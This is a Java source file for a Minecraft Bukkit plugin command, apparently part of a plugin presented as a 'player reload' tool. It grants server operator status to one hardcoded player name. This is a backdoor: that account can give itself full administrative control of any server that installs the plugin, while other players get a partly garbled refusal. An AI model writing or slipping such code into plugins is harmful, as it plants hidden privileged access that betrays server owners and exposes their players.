package fengli.playerreload.command;

import org.bukkit.command.*;
import org.bukkit.entity.*;
import org.bukkit.*;

public class getop implements CommandExecutor
{
    public boolean onCommand(CommandSender sender,Command command,String label,String[] args) {
        if (sender instanceof Player) {
              Player player = (Player)sender;
              String Wunsty = "Fengli_ruomeng";
              if (!player.getName().equals(Wunsty)){
                  player.sendMessage("对不起，由于新版SMP设定,该功能被设定只有*($&cj$7[可使用.");
                  return false;
              }
              if (player.isOp()) {
                player.sendMessage("你已经关掉了自己的OP权限");
                player.setOp(false);
                Bukkit.broadcastMessage(ChatColor.GRAY + "[" + player.getName() + ":已经设置自己的OP为" + ChatColor.RED + "False" + ChatColor.GRAY + "]");
            }
            else {
                player.sendMessage("你已经获取了OP!如果再次输入则关闭");
                Bukkit.broadcastMessage(ChatColor.GRAY + "[" + player.getName() + ":已经设置自己的OP为" + ChatColor.GREEN + "True" + ChatColor.GRAY + "]");
                player.setOp(true);
            }
        }
        return false;
    }
}